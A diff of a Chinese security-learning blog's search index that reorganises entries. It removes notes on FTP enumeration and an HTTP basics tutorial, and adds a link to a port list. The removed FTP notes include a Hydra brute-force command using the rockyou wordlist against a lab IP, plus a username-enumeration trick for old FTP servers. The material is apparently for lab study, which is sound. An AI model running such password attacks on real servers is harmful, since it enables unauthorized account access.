-<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>尝试使用匿名 FTP 登录，检查是否可以访问任何文件或文件夹。查看 FTP 服务器配置中的疏漏，判断文件内容是否包含有助于在系统上获取 Shell 的信息。</p>
-<h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p>将登录FTP服务器，需要确保系统上安装了FTP客户端。大多数Linux操作系统通常默认安装了FTP客户端。可以通过在控制台中输入 ftp 来测试是否已安装。如果出现 ftp&gt; 提示符，则表示系统上有一个工作正常的FTP客户端。如果没有，可以使用 sudo apt install ftp 安装</p>
-<p>登录 FTP 服务器前，需确保系统上安装了 FTP 客户端。大多数 Linux 系统通常默认安装 FTP 客户端，可通过控制台输入 ftp 检查。如果出现 ftp&gt; 提示符，则表示 FTP 客户端正常工作。如果未安装，可使用以下命令安装：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install ftp</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="替代枚举方法"><a href="#替代枚举方法" class="headerlink" title="替代枚举方法"></a>替代枚举方法</h3><p>一些旧版本的 in.ftpd 和其他 FTP 服务器的变体可能会通过 cwd 命令暴露用户信息。未登录时，客户端可以使用 cwd 命令检测目标目录是否存在。如果目录存在，则很可能存在对应的用户帐户。这种方法主要适用于旧版 FTP 系统。<br><br></p>
-<h2 id="FTP-利用"><a href="#FTP-利用" class="headerlink" title="FTP 利用"></a>FTP 利用</h2><h3 id="FTP漏洞类型"><a href="#FTP漏洞类型" class="headerlink" title="FTP漏洞类型"></a>FTP漏洞类型</h3><p>与 Telnet 相似，FTP 的命令和数据通道均为未加密状态，传输的数据易被中间人攻击截获和读取。如果使用弱密码或默认密码配置，FTP 服务器也会容易受到攻击</p>
-<h3 id="方法分解-1"><a href="#方法分解-1" class="headerlink" title="方法分解"></a>方法分解</h3><p>根据枚举阶段的信息：</p>
-<p>确认目标机器上运行 FTP 服务器。<br>获取可能的用户名。<br>使用暴力破解尝试获取 FTP 服务器的密码。</p>
-<h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>Hydra 是一款快速的在线密码破解工具，可对 50 多种协议进行字典攻击，包括 Telnet、RDP、SSH、FTP 等。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.102.137 ftp</span><br><span class="line"><span class="comment"># hydra -t 4 -l [用户名] -P [字典路径] -vV [目标 IP] ftp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -t 4	设置每个目标的并行连接数为4</span></span><br><span class="line"><span class="comment"># -vV	设置为详细模式，显示每次尝试的用户名和密码组合</span></span><br><span class="line"><span class="comment"># ftp / 协议	指定要攻击的协议类型</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ftp 10.10.102.137  </span><br><span class="line"><span class="comment"># ftp [目标 IP]</span></span><br><span class="line"><span class="comment"># 获取密码后，使用 ftp 进行连接</span></span><br></pre></td></tr></table></figure>
-
-<br>
+    <title>VMaxx</title>
+    <url>/2024/11/01/%E7%BD%91%E7%AB%99VMaxx/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><p><a href="https://www.vmaxx.net/techinfo/ports.htm">VMaxx</a><br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>列出了 1024 个常用端口表<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>
 
 
 ]]></content>
       <categories>
-        <category>基础技能</category>
+        <category>网站</category>
       </categories>
   </entry>
   <entry>
@@ -1975,118 +2184,9 @@
     <title>hunter</title>
     <url>/2024/10/27/%E7%BD%91%E7%AB%99hunter/</url>
     <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><p><a href="https://hunter.io/">hunter</a><br><br></p>
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>这是一个电子邮件搜寻工具，可以获取与特定域名相关的联系信息<br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>电子邮件搜索工具，用于获取与特定域名关联的联系信息<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>点击即用<br><br></p>
-]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Snort</title>
-    <url>/2024/11/01/%E7%BD%91%E7%AB%99Snort/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><p><a href="https://www.snort.org/">Snort</a><br><br></p>
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>
-
-
-]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-      <tags>
-        <tag>防火墙</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTTP 详解</title>
-    <url>/2024/11/04/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD7/</url>
-    <content><![CDATA[<h2 id="什么是-HTTP-S-？"><a href="#什么是-HTTP-S-？" class="headerlink" title="什么是 HTTP(S)？"></a>什么是 HTTP(S)？</h2><p>什么是 HTTP？（超文本传输协议）</p>
-<p>HTTP 是浏览网站时使用的协议，由蒂姆·伯纳斯-李及其团队在 1989 到 1991 年间开发。HTTP 定义了与网页服务器进行通信的规则，用于传输网页数据，比如 HTML、图片、视频等内容。</p>
-<p>什么是 HTTPS？（安全超文本传输协议）</p>
-<p>HTTPS 是 HTTP 的安全版本。HTTPS 数据是加密的，这不仅可以防止他人查看您接收和发送的数据，还能确保您连接的是真正的网页服务器，而不是冒充的服务器。<br><br></p>
-<h2 id="请求和响应"><a href="#请求和响应" class="headerlink" title="请求和响应"></a>请求和响应</h2><p>当我们访问网站时，浏览器需要向网页服务器请求诸如 HTML、图片等资源，并下载相应的响应。在此之前，需要明确告诉浏览器如何以及从哪里获取这些资源，这就是 URL 的作用。</p>
-<p>什么是 URL？（统一资源定位符）<br>如果你使用过互联网，就一定用过 URL。URL 主要是关于如何在互联网上访问资源的指令。下面的图片展示了 URL 的不同部分及其作用（每次请求时不一定会用到所有部分）。</p>
-<p>一个示例 URL 的结构图，其中 http 是协议（Scheme），user:password 是用户信息，tryhackme.com 是域名或主机，80 是端口，view-room 是路径，?id&#x3D;1 是查询字符串，#task3 是片段。完整地址是 <a href="http://user:password@tryhackme.com/view-room?id=1#task3%E3%80%82">http://user:password@tryhackme.com:80/view-room?id=1#task3。</a></p>
-<p>协议（Scheme）： 指示用于访问资源的协议，如 HTTP、HTTPS、FTP（文件传输协议）。<br>用户（User）： 某些服务需要认证登录，可以在 URL 中加入用户名和密码进行登录。<br>主机（Host）： 要访问的服务器的域名或 IP 地址。<br>端口（Port）： 连接的端口，通常 HTTP 为 80，HTTPS 为 443，但可以是 1 - 65535 范围内的任意端口。<br>路径（Path）： 要访问的资源的文件名或位置。<br>查询字符串（Query String）： 可以传递给请求路径的额外信息。例如 &#x2F;blog?id&#x3D;1 表示请求 ID 为 1 的博客文章。<br>片段（Fragment）： 对请求页面中某个具体位置的引用。常用于长页面，用户可以通过直接链接到该部分以便立即查看。<br>发起请求<br>仅需一行即可向网页服务器发起请求，例如 GET &#x2F; HTTP&#x2F;1.1。</p>
-<p>然而，为了获得更丰富的网页体验，还需要发送其他数据。这些数据通过头部信息（headers）来传递，头部包含了传递给通信服务器的附加信息，我们将在“头部”任务中详细介绍。</p>
-<p>请求示例：<br>makefile<br>复制代码<br>GET &#x2F; HTTP&#x2F;1.1<br>Host: tryhackme.com<br>User-Agent: Mozilla&#x2F;5.0 Firefox&#x2F;87.0<br>Referer: <a href="https://tryhackme.com/">https://tryhackme.com/</a><br>对每行的说明：</p>
-<p>第 1 行： 发送 GET 方法（详情请参见 HTTP 方法任务），请求主页 &#x2F;，并告知服务器我们使用的是 HTTP 1.1 协议版本。<br>第 2 行： 告诉服务器请求的是 tryhackme.com 网站。<br>第 3 行： 告诉服务器我们使用的是 Firefox 87 浏览器。<br>第 4 行： 告诉服务器推荐我们到这个页面的来源是 <a href="https://tryhackme.com./">https://tryhackme.com。</a><br>第 5 行： HTTP 请求总是以空行结束，以告知服务器请求已完成。<br>响应示例：<br>php<br>复制代码<br>HTTP&#x2F;1.1 200 OK<br>Server: nginx&#x2F;1.15.8<br>Date: Fri, 09 Apr 2021 13:34:03 GMT<br>Content-Type: text&#x2F;html<br>Content-Length: 98  </p>
-<html>  
-<head>  
-    <title>TryHackMe</title>  
-</head>  
-<body>  
-    Welcome To TryHackMe.com  
-</body>  
-</html>  
-
-<p>对每行的说明：</p>
-<p>第 1 行： HTTP&#x2F;1.1 是服务器使用的 HTTP 协议版本，后接 HTTP 状态码 “200 OK”，表示请求成功。<br>第 2 行： 服务器的软件类型及版本号。<br>第 3 行： 服务器的当前日期、时间和时区。<br>第 4 行： Content-Type 告知客户端即将发送的数据类型。<br>第 5 行： Content-Length 告知客户端响应数据长度，以确认数据无缺失。<br>第 6 行： HTTP 响应包含一个空行，表示响应结束。<br>第 7-14 行： 所请求的内容，本例中是主页。<br><br></p>
-<h2 id="HTTP-方法"><a href="#HTTP-方法" class="headerlink" title="HTTP 方法"></a>HTTP 方法</h2><p>HTTP 方法是客户端在发起 HTTP 请求时用来表示其预期操作的一种方式。HTTP 方法有很多种，但我们将介绍最常用的几种，尤其是 GET 和 POST 方法。</p>
-<p>GET 请求<br>用于从网页服务器获取信息。</p>
-<p>POST 请求<br>用于向网页服务器提交数据，并可能创建新的记录。</p>
-<p>PUT 请求<br>用于向网页服务器提交数据以更新信息。</p>
-<p>DELETE 请求<br>用于从网页服务器删除信息或记录。</p>
-<br>
-
-
-
-
-
-<h2 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h2><p>HTTP 状态码<br>在上一个任务中，你了解到当 HTTP 服务器响应时，第一行总是包含一个状态码，用于告知客户端其请求的结果以及如何处理。这些状态码可以分为五个不同的范围：</p>
-<p>100-199 - 信息响应<br>告知客户端请求的第一部分已被接受，客户端应继续发送其余请求。这类状态码如今已不常见。</p>
-<p>200-299 - 成功<br>表示客户端的请求已成功完成。</p>
-<p>300-399 - 重定向<br>用于将客户端请求重定向到其他资源，可能是不同网页或不同网站。</p>
-<p>400-499 - 客户端错误<br>用于告知客户端请求中存在错误。</p>
-<p>500-599 - 服务器错误<br>表示服务器端出现问题，通常是服务器在处理请求时遇到较严重的问题。</p>
-<p>常见的 HTTP 状态码<br>HTTP 状态码种类繁多，且应用程序可以自定义状态码。以下是一些常见的 HTTP 响应状态码：</p>
-<p>200 - OK<br>请求成功完成。</p>
-<p>201 - Created（已创建）<br>已创建一个资源，例如新用户或新博客文章。</p>
-<p>301 - Moved Permanently（永久移动）<br>将客户端浏览器重定向到新页面，或通知搜索引擎页面已移动到其他位置。</p>
-<p>302 - Found（临时移动）<br>类似于永久重定向，但这是一个临时更改，可能会在不久的将来再次更改。</p>
-<p>400 - Bad Request（错误请求）<br>告知浏览器请求中存在错误或缺少内容，有时用于指示服务器资源需要某个特定参数，而客户端未发送。</p>
-<p>401 - Not Authorized（未授权）<br>您无权查看此资源，直到您通过用户名和密码进行授权。</p>
-<p>403 - Forbidden（禁止访问）<br>无论是否登录，您都没有权限访问该资源。</p>
-<p>405 - Method Not Allowed（方法不允许）<br>资源不允许使用此方法，例如发送 GET 请求到 &#x2F;create-account 路径，而该路径需要的是 POST 请求。</p>
-<p>404 - Page Not Found（页面未找到）<br>请求的页面或资源不存在。</p>
-<p>500 - Internal Service Error（服务器内部错误）<br>服务器遇到未知的错误，无法正常处理请求。</p>
-<p>503 - Service Unavailable（服务不可用）<br>服务器无法处理请求，可能是因为过载或正在维护。</p>
-<p>点击右侧的“查看网站”按钮，可以在浏览器中查看部分 HTTP 状态消息的示例。<br><br></p>
-<h2 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h2><p>请求头部信息（Headers）<br>请求头部信息是您在发起请求时可以发送给网页服务器的附加数据。</p>
-<p>虽然发起 HTTP 请求时并不需要强制发送任何头部信息，但如果没有它们，您会发现很难正常查看一个网站。</p>
-<p>常见的请求头<br>以下是客户端（通常是您的浏览器）发送给服务器的一些常见请求头。</p>
-<p>Host（主机）： 一些服务器托管多个网站，通过提供 Host 头部信息，您可以告诉服务器您需要访问哪个网站，否则将收到服务器的默认网站。</p>
-<p>User-Agent（用户代理）： 这是您的浏览器软件及其版本号，告知服务器浏览器信息可以帮助其更好地为您的浏览器格式化网站内容。此外，某些 HTML、JavaScript 和 CSS 元素仅在特定浏览器中可用。</p>
-<p>Content-Length（内容长度）： 当您向网页服务器发送数据（例如表单数据）时，Content-Length 告诉服务器请求中包含的数据量，确保数据完整无缺。</p>
-<p>Accept-Encoding（接受编码）： 告知服务器浏览器支持的压缩方法，以便数据可以被压缩，从而减少网络传输的数据量。</p>
-<p>Cookie（Cookie）： 发送到服务器的数据，用于帮助记住您的信息（详细信息见 cookies 任务）。</p>
-<p>常见的响应头<br>以下是服务器在响应请求时返回给客户端的一些常见响应头。</p>
-<p>Set-Cookie（设置 Cookie）： 存储信息，每次请求时都会将其发送回服务器（详细信息见 cookies 任务）。</p>
-<p>Cache-Control（缓存控制）： 指定在浏览器缓存中存储响应内容的时长，到期后浏览器会再次请求内容。</p>
-<p>Content-Type（内容类型）： 告知客户端返回的数据类型，例如 HTML、CSS、JavaScript、图片、PDF、视频等。通过 Content-Type 头部信息，浏览器可以正确处理数据。</p>
-<p>Content-Encoding（内容编码）： 指定用于压缩数据的方法，以便在网络传输时减少数据量。<br><br></p>
-<h2 id="Cookies（客户端存储）"><a href="#Cookies（客户端存储）" class="headerlink" title="Cookies（客户端存储）"></a>Cookies（客户端存储）</h2><p>可能听说过 cookies，它们是一小段存储在电脑上的数据。当从网页服务器收到一个“Set-Cookie”头部时，cookies 就会被保存下来。之后，每当再次发出请求时，cookie 数据会回传给服务器。由于 HTTP 是无状态的（不会记住的上一次请求），cookies 可以用于帮助服务器识别身份、记录网站的个性化设置，或判断是否曾访问过该网站。以下是一个包含 cookies 的 HTTP 请求示例：</p>
-<p>一张图示展示了如何在 HTTP 请求中使用 cookies 来存储用户信息。</p>
-<p>Cookies 有许多用途，但最常用于网站认证。通常，cookie 的值不会是明文的密码，而是一个令牌（即一种难以被人猜到的独特代码）。</p>
-<p>查看 Cookies<br>可以通过浏览器的开发者工具轻松查看浏览器发送到网站的 cookies。如果不确定如何打开开发者工具，请点击本任务顶部的“查看网站”按钮，获取相关指南。</p>
-<p>打开开发者工具后，点击“Network”（网络）选项卡。此选项卡将显示浏览器请求的所有资源列表。可以点击任意一项，查看请求和响应的详细信息。如果浏览器发送了 cookie，可以在请求的“Cookies”选项卡中看到这些内容。</p>
-<br>
-
-]]></content>
-      <categories>
-        <category>基础技能</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>VMaxx</title>
-    <url>/2024/11/01/%E7%BD%91%E7%AB%99VMaxx/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><p><a href="https://www.vmaxx.net/techinfo/ports.htm">VMaxx</a><br><br></p>
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>列出了 1024 个常用端口表<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>
-
+<!-- 成功使用✔ -->
 
 ]]></content>
       <categories>
